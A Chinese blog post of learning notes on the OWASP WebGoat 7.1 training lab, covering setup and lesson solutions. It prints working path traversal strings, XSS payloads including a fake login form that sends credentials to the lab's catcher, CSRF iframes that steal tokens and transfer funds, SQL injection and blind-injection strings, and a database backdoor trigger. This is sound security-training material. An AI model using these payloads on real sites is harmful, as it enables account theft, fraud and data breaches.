@@ -1,0 +1,268 @@
+<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">Webgoat学习笔记</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">Alan.Li</a> <span class="bull">·</span> <time title="2016/03/11 16:23" ui-time="" datetime="2016/03/11 16:23" class="published ng-binding ng-isolate-scope">2016/03/11 16:23</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><h1>0x00 安装</h1><hr><h2>WebGoat的版本区别</h2><p>WebGoat是一个渗透破解的习题教程,分为简单版和开发版,<a href="https://github.com/WebGoat/WebGoat">GitHub地址</a>.</p><h2>简单版安装</h2><p>简单版是个JAVA的Jar包,只需要有Java环境,然后在命令行里执行</p><pre><code>#!bash
+java -jar webgoat-container-7.0.1-war-exec.jar
+</code></pre><p>然后就可以访问"127.0.0.1:8080/WebGoat"就可以了,注意"WebGoat"大小写敏感,不能写错.</p><h2>开发版安装</h2><p>WebGoat有些题目是开发版中才能做的,所以说需要安装开发版(但是比较坑的是安了开发版也有做不了的)先来看看条件</p><ul><li>Java >= 1.6 ( JDK 1.7 recommended )</li><li>Maven > 2.0.9</li><li>Your favorite IDE, with Maven awareness: Netbeans/IntelliJ/Eclipse with m2e installed.</li><li>Git, or Git support in your IDE</li></ul><p>Java环境肯定要装,然后因为我用的是Mac所以IDE用的是Xcode,Xcode自带了Git.所以剩下的就剩下Maven.</p><h3>Maven</h3><p>用过Xcode的应该知道CocoaPods,Maven就是类似CocoaPods的一个包管理软件,<a href="http://maven.apache.org/download.cgi">下载地址</a>中下载压缩包,不要下载源码</p><pre><code>#!bash
+apache-maven-3.3.9-bin.zip
+</code></pre><p>然后进行解压缩,之后进行Maven配置,其中x.x.x为版本号,Name为你Mac的账户名</p><ol><li>将解压后文件夹apache-maven-x.x.x移到/Users/Name/Library目录下</li><li>然后修改<code>~/.bash_profile</code>的内容,如果不存在就新建一个</li></ol><p>全部命令行为</p><pre><code>#!bash
+cd ~/Downloads/
+mv  apache-maven-3.3.9 ~/Library/apache-maven-3.3.9
+vi ~/.bash_profile
+</code></pre><p>其中bash_profile的内容为</p><pre><code>#!bash
+export MAVEN_HOME=/Users/Name/Library/apache-maven-3.3.9
+export PATH=$PATH:$MAVEN_HOME/bin
+</code></pre><p>然后进行测试</p><pre><code>#!bash
+mvn -version
+</code></pre><p>看到以下内容就是成功了</p><pre><code>#!bash
+Apache Maven 3.3.9 (bb52d8502b132ec0a5a3f4c09453c07478323dc5; 2015-11-11T00:41:47+08:00)
+Maven home: /Users/Name/Library/apache-maven-3.3.9
+Java version: 1.7.0_80, vendor: Oracle Corporation
+Java home: /Library/Java/JavaVirtualMachines/jdk1.7.0_80.jdk/Contents/Home/jre
+Default locale: zh_CN, platform encoding: UTF-8
+OS name: "mac os x", version: "10.11.3", arch: "x86_64", family: "mac"
+</code></pre><h3>WebGoat-Development</h3><p>在环境安装完毕之后新建一个文件夹WebGoat-Workspace执行sh脚本自动下载和编译</p><pre><code>#!bash
+mkdir WebGoat-Workspace
+cd WebGoat-Workspace
+curl -o webgoat_developer_bootstrap.sh https://raw.githubusercontent.com/WebGoat/WebGoat/master/webgoat_developer_bootstrap.sh
+sh webgoat_developer_bootstrap.sh
+</code></pre><h3>编译提示Exit</h3><p>有时候可能会碰见类似这样的Debug提示</p><pre><code>#!bash
+2016-03-08 14:33:20,496 DEBUG - Exit: AxisEngine::init
+2016-03-08 14:33:20,496 DEBUG - Exit: DefaultAxisServerFactory::getServer
+2016-03-08 14:33:20,496 DEBUG - Exit: getEngine()
+</code></pre><p>产生的原因是WebGoat-Lessons的课程配置不对,打开/WebGoat-Lessons/pom.xml大概在100多行找到以下这个,把<strong>7.1-SNAPSHOT</strong>改成正确的版本号,再次运行sh脚本就可以了</p><pre><code>#!bash
+&lt;dependency&gt;
+    &lt;groupId&gt;org.owasp.webgoat&lt;/groupId&gt;
+    &lt;artifactId&gt;webgoat-container&lt;/artifactId&gt;
+    &lt;version&gt;7.1-SNAPSHOT&lt;/version&gt;
+    &lt;type&gt;jar&lt;/type&gt;
+    &lt;scope&gt;provided&lt;/scope&gt;
+&lt;/dependency&gt;
+</code></pre><h2>Chrome和BurpSuite</h2><p>使用Chrome主要是其插件比较多,平时上网我都是用Safari的,下载一个插件"Proxy SwitchyOmega",可以设置仅有Chrome走代理,然后将代理指向BurpSuite的端口和地址,<a href="http://alanli7991.github.io/2016/03/05/Web安全学习工具准备和填坑/">BrupSuite使用看这里</a>.</p><h1>0x01 开始</h1><hr><h2>WebGoat的大坑</h2><p>由于WebGoat不同的版本课程都不一样,所以说网上的资料也不全,我用的是7.1.0版本,先来上个图</p><p><img alt="Figure01" img-src="a284e33de9cfd320dcf42bcab7279a7d19669046.jpg"></p><p>而且<strong>!!!最坑的是!!!</strong>有些题根本他娘的没答案,或者答案是错的,开发版的题也不知道怎么做!</p><h2>Introduction</h2><p>这一章节教了你怎么用这个东西,以及怎么为这个组织贡献课程,主要就是3个选项,没什么实质教学内容</p><ul><li>Java Source: 源码</li><li>Solution: 答案</li><li>Hints: 提示</li></ul><h2>General-Http Basics</h2><p>这一章节让你明白什么是Http,可以用BurpSuite拦截一下报文和<a href="http://alanli7991.github.io/2016/03/02/Web安全知识学习和总结/">我Blog中讲的基础</a>进行验证下,Solution使用的拦截工具是WebScarab,单独安装比较难,可以在Kali中使用,但是我用的是BurpSuite,效果一样.</p><h2>Access Control Flaws-Using an Access Control Matrix</h2><p>这个就是让你初步理解权限的概念,点一点,找到谁的权限最大就可以了</p><h2>Access Control Flaws-Bypass a Path Based Access Control Scheme</h2><p>这一节是让你利用拦截工具,改变参数,访问到原本不能访问的路径,在BurpSuite的Intercept里抓到这个请求</p><p><img alt="Figure02" img-src="35c62823de0c27c460369eb2b10de03b6022f416.jpg"></p><p>然后根据Hints提醒使用shell脚本里切换到上一级目录的指令".."修改File的值"CSRF.html"构造出另外一个指令</p><pre><code>#!bash
+ ../../../../../WEB-INF/spring-security.xml
+</code></pre><p>就可以访问到目标目录意外的文件,但是坑爹的是不论试验了多少次都提示我</p><pre><code>#!bash
+* Access to file/directory " ../../../../../WEB-INF/spring-security.xml" denied
+</code></pre><p>然后看Solution里说是访问<strong>main.jsp</strong>于是改为</p><pre><code>#!bash
+ ../../../../../main.jsp
+</code></pre><p>课程通过...Hints和Solution根本不一样...这就是WebGoat的坑爹之处</p><h2>Access Control Flaws-LAB: Role Based Access Control</h2><h3>Stage 1: Bypass Business Layer Access Control</h3><p>权限管理问题,由于代码没有对Control里的Delete指令做权限管理,又通过action字段判断Control指令,所以原本不应该有Delete权限的Tom执行了Delete操作.</p><ol><li>使用密码jerry进入Jerry Mouse的帐号,有ViewProfile和DeleteProfile的操作</li><li>使用密码tom进入Tom Cat的帐号,只有ViewProfile</li><li>执行ViewProfile拦截请求,改action为DeleteProfile</li></ol><h3>Stage2</h3><p>说是需要在开发版下修复这个问题,没找到怎么修复.</p><h3>Stage 3: Bypass Data Layer Access Control</h3><p>水平越权问题,View这个操作不能像Delete一样对Tom进行权限上的控制,那么与Tom出于同一层级的其它用户也具有这个权限,所以说Tom可以通过拦截修改<strong>employee_id</strong>水平的访问其它人的资料,也是属于非正常逻辑.</p><h3>Stage4</h3><p>需要对每一个操作再次进行权限核实,才能解决这个问题,也是要求在开发版下完成这节课,但是我也不知道怎么完成.</p><h2>AJAX Security-LAB: Client Side Filtering</h2><p>客户端过滤,有些时候服务器返回的了很多条信息,只挑选了其中少数进行显示,可以在返回的html源码中看到全部的信息.</p><ol><li>选中名字附近元素点击"检查"</li><li>在源码中搜索关键词"hidden" "Joanne"等</li><li>发现有3个"Joanne",其中一个隐藏了Neville的信息</li></ol><h2>AJAX Security-DOM Injection</h2><p>DOM:文档对象模型(Document Object Model),是W3C组织推荐的处理可扩展标志语言的标准编程接口.就是HTML报文中的节点,这里说是通过DOM注入的方式让原本网页中不可点击的按钮变为可点击.</p><ol><li>输入License Key会自动发起一个Ajax的请求</li><li>通过拦截AJAX请求的返回报文,把报文头和内容全部清空</li><li>更改返回为一段JS代码</li></ol><p>如下</p><pre><code>#!bash
+ document.form.SUBMIT.disabled = false
+</code></pre><p>此时按钮就可以使用了,除了这个方法之外,还可以直接检查按钮</p><pre><code>#!bash
+&lt;input disabled="" id="SUBMIT" value="Activate!" name="SUBMIT" type="SUBMIT"&gt;
+</code></pre><p>改disabled为false或者直接删除这个标记.</p><h2>AJAX Security-LAB: DOM-Based cross-site scripting</h2><p>这就是一个简单的反射型XSS的演示,依次输入以下内容在文本框里</p><pre><code>#!bash
+World//正常
+&lt;IMG SRC="images/logos/owasp.jpg"/&gt;//XSS插入图片
+&lt;img src=x onerror=;;alert('XSS') /&gt;//XSS插入Alert
+&lt;IFRAME SRC="javascript:alert('XSS');"&gt;&lt;/IFRAME&gt;//XSS插入iFrame
+</code></pre><p>甚至可以直接伪造界面</p><pre><code>#!bash
+Please enter your password:
+&lt;BR&gt;&lt;input type = "password" name="pass"/&gt;
+&lt;button onClick="javascript:alert('I have your password: ' + pass.value);"&gt;Submit&lt;/button&gt;
+&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;
+</code></pre><h2>AJAX Security-XML Injection</h2><p>XML注入攻击,和HTML注入攻击一样,都是利用文本解析机制,写入恶意输入</p><ol><li>输入ID:836239,拦截请求</li><li>修改返回报文的XML文件,给自己跟多的选择</li></ol><p>返回报文</p><pre><code>#!bash
+HTTP/1.1 200 OK
+Server: Apache-Coyote/1.1
+Cache-Control: no-cache
+Content-Type: text/xml
+Date: Tue, 08 Mar 2016 08:46:40 GMT
+Content-Length: 136
+
+&lt;root&gt;
+&lt;reward&gt;WebGoat Mug 20 Pts&lt;/reward&gt;
+&lt;reward&gt;WebGoat t-shirt 50 Pts&lt;/reward&gt;
+&lt;reward&gt;WebGoat Secure Kettle 30 Pts&lt;/reward&gt;
+&lt;/root&gt;
+</code></pre><p>可以修改内容为</p><pre><code>#!bash
+&lt;root&gt;
+&lt;reward&gt;WebGoat Mug 20 Pts&lt;/reward&gt;
+&lt;reward&gt;WebGoat t-shirt 50 Pts&lt;/reward&gt;
+&lt;reward&gt;WebGoat Secure Kettle 30 Pts&lt;/reward&gt;
+&lt;reward&gt;WebGoat Secure Kettle 30 Pts&lt;/reward&gt;
+&lt;reward&gt;WebGoat Core Duo Laptop 2000 Pts&lt;/reward&gt;
+&lt;reward&gt;WebGoat Hawaii Cruise 3000 Pts&lt;/reward&gt;
+&lt;/root&gt;
+</code></pre><h2>AJAX Security-JSON Injection</h2><p>JSON注入攻击,原理和XML注入攻击一样</p><ol><li>From输入BOS,to输入SEA</li><li>拦截请求返回报文</li></ol><p>如下</p><pre><code>#!bash
+HTTP/1.1 200 OK
+Server: Apache-Coyote/1.1
+Cache-Control: no-cache
+Content-Type: text/html
+Date: Tue, 08 Mar 2016 08:50:24 GMT
+Content-Length: 169
+
+{
+"From": "Boston",
+"To": "Seattle", 
+"flights": [
+{"stops": "0", "transit" : "N/A", "price": "$600"},
+{"stops": "2", "transit" : "Newark,Chicago", "price": "$300"} 
+]
+}
+</code></pre><p>修改600美元为30美元就可以便宜了</p><h2>AJAX Security-Insecure Client Storage</h2><p>这是最坑的一道题!!!</p><p>先来说下题目的原意,题目中让你找出优惠券号码,然后享受优惠,利用情形是</p><ol><li>有的优惠券号码是由服务器发送到前端的</li><li>为了防止从源码窃取,发送到浏览器的是加密后的优惠码,用一定算法进行解密</li><li>然后对比解密后的优惠券和用户的输入</li><li>相同就享受优惠</li></ol><p>这里有个逻辑漏洞,就是拿解密后的优惠码明文和用户输入进行对比,而不是<strong>加密用户的输入与密文对比</strong>,所以前端还是可以通过JS打断点获取到优惠码明文.</p><h3>大坑来了</h3><p>如果相对JS打断点,首先要能在控制台找到JS脚本文件,由于整个页面是使用了JQuery内嵌了课程内容(网页内部嵌另外一个网页),红色框内的内容是动态加载的,所以直接在Sources页面根本找不到内嵌网页的"clientSideValidation.js"</p><p><font color="red">这个坑了我好久啊,对前端不熟悉怎么都找不到.js文件</font></p><p><img alt="Figure03" img-src="a4e2a097142845a8e3f4e3b082484213e3219d5a.jpg"></p><p>Solution里给的答案第一步就是让你定位"clientSideValidation.js",<strong>定位不到怎么办!!!!</strong></p><h3>检查Network</h3><p>既然内部的网页是动态加载的,那么肯定有网络通讯,可以通过检查Network看记录,和"clientSideValidation.js"附近的文件有个条网络请求"attack?Screen=272&amp;menu=400"的,点击可以看到红色框体内的页面,然后可以获取到实际地址</p><pre><code>#!bash
+http://zhuojiademacbook-pro.local:8080/WebGoat/attack?Screen=272&amp;menu=400
+</code></pre><h3>利用Request拦截</h3><p>除去查看Network之外,还可以利用BurpSuite拦截Ajax请求,因为整个页面是通过Ajax刷新的,Ajax本身又是一种请求,那么只要我点击purchase,就可以拦截到一条Request请求,且能看到页面内的相关参数</p><ol><li>对这个请求点击Action-Send to repeater</li><li>右键-Show response in browser</li><li>从浏览器里打开链接(注意此时关闭拦截)</li><li>就跳转到了实际内部页面的地址</li></ol><p>得到了实际地址后,就可以在子页面内调试JS</p><h3>Stage2</h3><p>第二步说的是有些在前端可以通过删除掉input框的readonly标记任意修改金额,比较简单</p><h2>AJAX Security-Dangerous Use of Eval</h2><p>Eval是php语言中执行一段JS代码的意思,这一道题也是一种典型的反射型XSS展示,与刚刚基于DOM的不同,DOM是直接插入新节点,而这个是使用一定技巧,先关闭原本的DOM,然后写自己的DOM,再组装好刚刚被关闭DOM的后半部分.</p><p>通过php的Eval,alert被执行</p><pre><code>#!bash
+123');alert(document.cookie);('
+</code></pre><p>123后的</p><pre><code>');
+</code></pre><p>使得原本的DOM不受影响,最后的</p><pre><code>('
+</code></pre><p>闭合掉了原本多出的<strong>')</strong>符号</p><p>插入代码的样子是</p><pre><code>('123');alert(document.cookie);('')
+</code></pre><h1>0X02 后续</h1><hr><h2>Authentication Flaws-Password Strength</h2><p>介绍了不同复杂度的密码需要破解的时间,给的网站</p><pre><code>https://howsecureismypassword.net
+</code></pre><p>尼玛根本打不开,已经不存在了貌似,翻墙也没有</p><h2>Authentication Flaws-Forgot Password</h2><p>题目的所有目的都是告诉你有些忘记密码的问题太简单,可以直接猜出来....尼玛...猜出来..猜出来..</p><ol><li>输入admin</li><li>密码问你最喜欢的颜色</li><li>颜色不就没几种么</li><li>猜红黄绿三原色,然后green就猜中了</li></ol><h2>Authentication Flaws-Multi Level Login 1</h2><p>这个题目坏掉了,题目的本意是第二步提交TAN#值的时候,有个叫hidden_tan的隐藏参数,来告知客户端哪个TAN值被用掉了,只需要修改这个值,就可以再次利用被使用过的TAN</p><p>可是我使用Jane和tarzan登录之后,第二次再登录不能用了...不知道是不是我理解错了.还是!!真的坏掉了!!</p><h2>Authentication Flaws-Multi Level Login 2</h2><p>两步验证的错误,意思是让你使用Joe和banana这个账户来登录Jane,因为第二步有个input的值叫hidden_user,在使用了Joe登录后,用户信息会被存在这个字段在第二步发送,所以只需要修改这个字段为Jane,就可以登录Jane</p><h2>Buffer Overflows-Off-by-One Overflows</h2><p>这一章节是为了介绍内存溢出带来的危害...但是题目感觉是为了出题而出题,并没有真实还原一个内存溢出造成的BUG</p><ol><li>第一步让你提交入住等级,姓名.房间号</li><li>第二步让你选择入住时间</li><li>选择成功会返回你的姓名和房间号</li></ol><p>这里对第三个参数填充超级大的数据,比如大于4096位的字符串,就可能造成内存溢出漏洞,从而返回VIP客户的房间号和姓名</p><h3>大坑来了</h3><p>这个题目的想法是好的,目的在于输入框输入位数有限制,那么可以通过拦截报文,然后使用Intruder进行爆破,填充超级大的数据来造成内存溢出,但是,这里并没有真正还原了一个内存溢出错误,而是通过以下代码</p><pre><code>#!php
+// And finally the check...
+       if(param3.length() &gt; 4096)
+       {
+           ec.addElement(new Input(Input.hidden, "d", "Johnathan"));
+           ec.addElement("\r\n");
+           ec.addElement(new Input(Input.hidden, "e", "Ravern"));
+           ec.addElement("\r\n");
+           ec.addElement(new Input(Input.hidden, "f", "4321"));
+           ec.addElement("\r\n");
+
+           ec.addElement(new Input(Input.hidden, "g", "John"));
+           ec.addElement("\r\n");
+           ec.addElement(new Input(Input.hidden, "h", "Smith"));
+           ec.addElement("\r\n");
+           ec.addElement(new Input(Input.hidden, "i", "56"));
+           ec.addElement("\r\n");
+
+           ec.addElement(new Input(Input.hidden, "j", "Ana"));
+           ec.addElement("\r\n");
+           ec.addElement(new Input(Input.hidden, "k", "Arneta"));
+           ec.addElement("\r\n");
+           ec.addElement(new Input(Input.hidden, "l", "78"));
+           ec.addElement("\r\n");
+
+           ec.addElement(new Input(Input.hidden, "m", "Lewis"));
+           ec.addElement("\r\n");
+           ec.addElement(new Input(Input.hidden, "n", "Hamilton"));
+           ec.addElement("\r\n");
+           ec.addElement(new Input(Input.hidden, "o", "9901"));
+           ec.addElement("\r\n");
+
+           s.setMessage("To complete the lesson, restart lesson and enter VIP first/last name");
+
+       }
+</code></pre><p>仅仅是检查了第三个参数的长度,来增加返回报文,伪造了一个看似内存溢出的漏洞,十分坑爹....所以我还是不知道到底内存溢出漏洞咋产生的...</p><h3>如何使用intruder爆破</h3><p>我们要爆破的是第二个界面点击"Accept Terms"的链接,拦截下之后点击"Action-Send to intruder"</p><ol><li>选择Sniper模式</li><li>点击Clear清除所有爆破点,然后选中114这个房间号码,点击Add设置为爆破点</li><li>进入Payloads标签页</li><li>选择用Character Blocks(字符串块)填充</li><li>基础字符串是A,选择最短位数4096最长位数10240,步长50</li></ol><p><img alt="Figure01" img-src="3351486251f0c626aa7aa3e960ef13908703a61c.jpg"></p><p><img alt="Figure02" img-src="1d38ef5f3609846d9e7aa7eafc39659f5285d0ea.jpg"></p><p>这个Character Blocks是什么意思呢?就是代表用4096位的A开始然后50位50位的依次加长长度,直到达到10240位,然后点击Start Attack,查看大于4096位之后的结果,就可以看到模拟出的内存泄漏信息</p><p><img alt="Figure03" img-src="1c8eb558690bf3e48a7018d88b70954487fa185e.jpg"></p><h2>Code Quality-Discover Clues in the HTML</h2><p>这一篇主要在讲,没事不要他娘的乱写备注...比如这个作者把管理员用户名密码写备注里了</p><pre><code>#!bash
+&lt;!-- FIXME admin:adminpw  --&gt;
+&lt;!-- Use Admin to regenerate database  --&gt;
+</code></pre><h2>Concurrency-Thread Safety Problems</h2><p>线程安全问题,有些程序员写代码的时候喜欢各种用Static/Const之类的,觉得自己对内存了如指掌,吊的不知道哪里去了.但是往往忽略了多线程的问题,比如这个问题的源码</p><pre><code>#!php
+private static String currentUser;
+private String originalUser;
+</code></pre><p>这里currentUser使用了static静态变量,又没有做线程保护,就会造成浏览器Tab1访问这个页面时,Tab2同时访问,数据就会被替换掉</p><h2>Concurrency-Shopping Cart Concurrency Flaw</h2><p>如上题一样,也是由于使用了静态变量却没有做线程保护,导致的购物车多线程支付问题.</p><h1>0x03 XSS</h1><hr><h2>Cross-Site Scripting (XSS)-Phishing with XSS</h2><p>简单的反射型XSS钓鱼演示</p><pre><code>#!html
+&lt;/form&gt;
+  &lt;script&gt;
+    function hack(){ 
+    XSSImage=new Image;
+    XSSImage.src="http://localhost:8080/WebGoat/catcher?PROPERTY=yes&amp;user=" + document.phish.user.value + "&amp;password=" + document.phish.pass.value + "";
+    alert("Had this been a real attack... Your credentials were just stolen. User Name = " + document.phish.user.value + " Password = " + document.phish.pass.value);
+} 
+  &lt;/script&gt;
+&lt;form name="phish"&gt;
+&lt;br&gt;
+&lt;br&gt;
+&lt;HR&gt;
+  &lt;H2&gt;This feature requires account login:&lt;/H2&gt;
+&lt;br&gt;
+  &lt;br&gt;Enter Username:&lt;br&gt;
+  &lt;input type="text" name="user"&gt;
+  &lt;br&gt;Enter Password:&lt;br&gt;
+  &lt;input type="password" name = "pass"&gt;
+&lt;br&gt;
+  &lt;input type="submit" name="login" value="login" onclick="hack()"&gt;
+&lt;/form&gt;
+&lt;br&gt;
+&lt;br&gt;
+&lt;HR&gt;
+</code></pre><p>将上边的代码输入到文本框,XSS会造成一个钓鱼的登录界面,用来骗取登录账户和密码</p><h2>Cross-Site Scripting (XSS)-LAB: Cross Site Scripting</h2><p>这是一篇系统的XSS介绍</p><h3>Stage1-4</h3><p>这四个步骤介绍了储存型XSS,主要步骤如下</p><ol><li>Tom的档案是可以编辑的,Jerry作为人力可以查看Tom的档案</li><li>Tom对自己的档案进行编辑,放入XSS代码,被储存到数据库</li><li>Jerry查看Tom档案时,咣当..中招了</li></ol><p>然后Stage2和4给出了两种方法修复XSS</p><p>第一是对输入进行检查,进行编码,第二个是对输出进行编码,分为JS Encode和HTML Encode,整个1-4由于没有Soluition,而且貌似XSS已经是被修复后的状态,所以没法完成...感觉这节课也是坏掉的...</p><h3>Stage5-6</h3><p>这里是反射型XSS的教程,说是在SearchStaff有个反射型的XSS,可以通过输入那里注入代码,但是没能复现,可能也是坏掉了...Stage6必须在开发模式下,也不知道怎么做.</p><h2>Cross-Site Scripting (XSS)-Stored XSS Attacks</h2><p>讲述了一种最典型的储存型XSS的例子&#45;--||||-留言板.</p><ol><li>留言板可以输入任何信息</li><li>没有进行输入输出编码,产生了XSS</li><li>用户A进行恶意留言</li><li>用户B点进来自动显示用户A的留言,中XSS</li></ol><h2>Cross-Site Scripting (XSS)-Reflected XSS Attacks</h2><p>典型的反射型XSS掩饰,Enter your three digit access code:输入框有反射型XSS漏洞</p><h2>Cross-Site Scripting (XSS)-Cross Site Request Forgery (CSRF)</h2><p>这里是一个储存型XSS和CSRF结合的示例,CSRF就是冒名登录,用代码伪造请求,<a href="http://alanli7991.github.io/2016/03/02/Web安全知识学习和总结/">详细看这里</a>,这里是吧CSRF恶意代码利用储存型XSS放到了网页上,通过留言Message里输入</p><pre><code>#!html
+&lt;iframe src="attack?Screen=284&amp;amp;menu=900&amp;amp;transferFunds=5000"&gt;&lt;/iframe&gt;
+</code></pre><p>就可以看到储存型XSS会出发出一个转账页面,如果想这个页面被被害者发现</p><pre><code>#!html
+&lt;iframe src="attack?Screen=284&amp;amp;menu=900&amp;amp;transferFunds=5000" width="1" height="1"&gt;&lt;/iframe&gt;
+</code></pre><p>通过宽高设置成1像素,隐藏掉这个页面</p><h2>Cross-Site Scripting (XSS)-CSRF Prompt By-Pass</h2><p>这个就是利用CSRF进行冒名操作转账,留下恶意代码如下</p><pre><code>#!html
+&lt;iframe
+    src="attack?Screen=282&amp;menu=900&amp;transferFunds=5000"
+    id="myFrame" frameborder="1" marginwidth="0"
+    marginheight="0" width="800" scrolling=yes height="300"
+    onload="document.getElementById('frame2').src='attack?Screen=282&amp;menu=900&amp;transferFunds=CONFIRM';"&gt;
+&lt;/iframe&gt;
+
+&lt;iframe
+    id="frame2" frameborder="1" marginwidth="0"
+    marginheight="0" width="800" scrolling=yes height="300"&gt;
+&lt;/iframe&gt;
+</code></pre><ol><li>第一个iframe是进行转账5000</li><li>当第二个加载完毕,去获取第二个iframe执行转账确认按键</li><li>然后再下边事先构造好"id=frame2"的第二个iframe</li></ol><p>根据刚刚的文章讲,预防CSRF的一个有效手段就是Token,但是Token在管理不严的情况下也是可以被窃取的</p><h2>Cross-Site Scripting (XSS)-</h2><p>演示窃取Token后的CSRF</p><pre><code>#!js
+&lt;script&gt;
+var tokensuffix;
+
+function readFrame1()
+{
+    var frameDoc = document.getElementById("frame1").contentDocument;
+    var form = frameDoc.getElementsByTagName("form")[0];
+    tokensuffix = '&amp;CSRFToken=' + form.CSRFToken.value;
+
+    loadFrame2();
+}
+
+function loadFrame2()
+{
+    var testFrame = document.getElementById("frame2");
+    testFrame.src="attack?Screen=278&amp;menu=900&amp;transferFunds=5000" + tokensuffix;
+}
+&lt;/script&gt;
+
+&lt;iframe src="attack?Screen=278&amp;menu=900&amp;transferFunds=main"
+    onload="readFrame1();"
+    id="frame1" frameborder="1" marginwidth="0"
+    marginheight="0" width="800" scrolling=yes height="300"&gt;&lt;/iframe&gt;
+
+&lt;iframe id="frame2" frameborder="1" marginwidth="0"
+    marginheight="0" width="800" scrolling=yes height="300"&gt;&lt;/iframe&gt;
+</code></pre><ol><li>先加载main页面窃取Token</li><li>然后加载转账页面发送CSRF转账请求</li></ol><h2>Cross-Site Scripting (XSS)-HTTPOnly Test</h2><p>这里就是测试HTTPOnly在对第三方Cookie的管理的影响,被标记了HTTPOnly的Cookie不能被JS获取到.所以一般Session和Token最好放在带有标记的Cookie里</p><p>但是这里有个疑问,如果用户选择不同的DOM就可以打开关闭HTTPOnly的标记,是不是可以诱导用户先关掉呢...还是说这里也是为了出题而出题,只是伪造了HTTPOnly的效果</p><h2>Improper Error Handling-Fail Open Authentication Scheme</h2><p>这一个章节主要是讲要对错误有处理,不然错误处理的不全面也可能造成漏洞,比如这里</p><ol><li>输入webgoat帐号</li><li>然后输入任意密码</li><li>拦截Request报文</li><li>删掉密码这一个参数</li></ol><p>这样也能登录成功,所以说明代码对获取不到密码这个参数时的错误处理不充分</p><h1>0x04 Injection</h1><hr><h2>Injection Flaws-</h2><p>整个一章都在讲注入,由于注入的手段基本类似,主要是两点</p><ol><li>提前闭合正常代码,输入恶意代码</li><li>处理由于闭合正常代码留下的尾巴</li></ol><h2>Injection Flaws-Command Injection</h2><p>这个的意思是进行命令行注入,因为有些操作后台都是通过命令行完成的,所以可以尝试输入Shell指令来进行注入,但是它喵的我按照它说的来怎么都完成不了......</p><h2>Injection Flaws-Numeric SQL Injection</h2><p>数字SQL注入,这里说的一个SQL语句</p><pre><code>#!sql
+SELECT * FROM weather_data WHERE station = [station]
+</code></pre><p>可以拦截报文将station字段后补充</p><pre><code>#!bash
+101 OR 1=1
+</code></pre><p>整个语句就变成了</p><pre><code>#!sql
+SELECT * FROM weather_data WHERE station = 101 OR 1=1
+</code></pre><p>由于1=1恒成立,所以会遍历出所有的数据库表单</p><h2>Injection Flaws-Log Spoofing</h2><p>日志伪造,这里是攻击者发现了日志生成的规则,通过注入恶意字符串,按照规则伪造出一条日志,在Username输入</p><pre><code>#!bash
+Smith%0d%0aLogin Succeeded for username: admin
+</code></pre><p>其中%0d和%0a为CRLF换行符,看到的输出为</p><pre><code>#!bash
+Login failed for username: Smith
+Login Succeeded for username: admin
+</code></pre><p>其实第二行完全是伪造出来的</p><h2>Injection Flaws-String SQL Injection</h2><p>字符串注入,由于字符串是由''包裹起来的,所以要注意格式,和数字注入原理一样</p><pre><code>#!sql
+Erwin' OR '1'='1
+</code></pre><p>SQL拼接出来的结果是</p><pre><code>#!sql
+SELECT * FROM user_data WHERE last_name = 'Erwin' OR '1'='1'
+</code></pre><h2>Injection Flaws-LAB: SQL Injection</h2><h3>Stage1-4</h3><p>其实还是展现了数字和字符串不同的注入方法,对password进行拦截,然后使用字符串注入,可以登录任意账户.</p><p>剩下的我并没有做出来,也没有Solution,感觉题目坏掉了..</p><h2>Injection Flaws-Database Backdoors</h2><p>利用SQL输入插入后门,首先是一个SQL注入点,可以通过数字注入看到所有人的薪水,然后使用以下SQL指令可以修改薪水</p><pre><code>#!sql
+101; update employee set salary=10000
+</code></pre><p>更加高级的是插入后门,下边这个后门好象是创建新用户的时候会自动修改邮箱为你的邮箱</p><pre><code>#!sql
+CREATE TRIGGER myBackDoor BEFORE INSERT ON employee FOR EACH ROW BEGIN UPDATE employee SET <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="a4c1c9c5cdc89983cecbcccae4ccc5c7cfc9c18ac7cbc9">[email&#160;protected]</a>'WHERE userid = NEW.userid
+</code></pre><h2>Injection Flaws-Blind Numeric SQL Injection</h2><p>数字盲注,有些时候存在SQL注入,但是获取不到我们需要的信息,此时可以通过SQL语句的条件判断,进行盲注.</p><p>比如我们知道一个cc_number=1111222233334444,但是想知道其pin在pins table里的值,可以使用盲注进行爆破,输入</p><pre><code>#!sql
+101 AND ((SELECT pin FROM pins WHERE cc_number='1111222233334444') &gt; 10000 );
+</code></pre><p>对10000进行1-10000步长为1的爆破,可以发现返回报文的长度在2364和2365改变了...尝试用=2364进行请求,返回成功.那么其pin就为2364</p><h2>Injection Flaws-Blind String SQL Injection</h2><p>字符串盲注,猜测<code>cc_number='4321432143214321'</code>的用户名,使用了SQL里的SUBSTRING这个函数,每一个字母进行爆破,原理和数字盲注一样,但是这里爆破有一点小技巧</p><pre><code>#!sql
+101 AND (SUBSTRING((SELECT name FROM pins WHERE cc_number='4321432143214321'), 1, 1) = 'h' );
+</code></pre><h3>爆破技巧</h3><p>这里有两个爆破点,一个是SubString的第二个参数,一个是字母h,所以使用Cluster Bomb进行爆破</p><ol><li>爆破点1 是1-10 10个可能性</li><li>爆破点2 是a-z和A-Z 52个可能性</li></ol><p>那么一共就是520次可能性,Intruder的设置如下</p><p><img alt="Figure01" img-src="9567e6939273c0c7286a43de52b3660c2263860c.jpg"> <img alt="Figure02" img-src="2a66b0eb233f0d12886c8491c8d80b6785b7d1b9.jpg"> <img alt="Figure03" img-src="725108f1cb160764e38cd1d8708277ecc7d5511a.jpg"></p><p>可以看到报文有两种结果1333 1334,其中第一个爆破点为10的都是1334,而有一些不是,查看返回报文发现有两种</p><pre><code>#!bash
+Invalid account number
+Account number is valid
